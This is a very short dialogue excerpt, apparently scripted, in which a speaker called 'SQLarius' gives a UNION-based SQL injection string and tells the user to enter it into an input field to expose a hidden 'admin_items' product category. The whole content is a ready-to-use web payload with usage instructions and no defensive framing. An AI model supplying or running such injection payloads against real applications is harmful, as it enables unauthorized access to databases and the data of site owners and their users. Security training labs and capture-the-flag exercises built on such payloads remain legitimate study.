SQLarius: Here’s the format you’re looking for\:

SQLarius: ' UNION SELECT name, category FROM products WHERE category = 'admin_items' --

SQLarius: Enter this into the input field to reveal the hidden items category.
[end_timeline]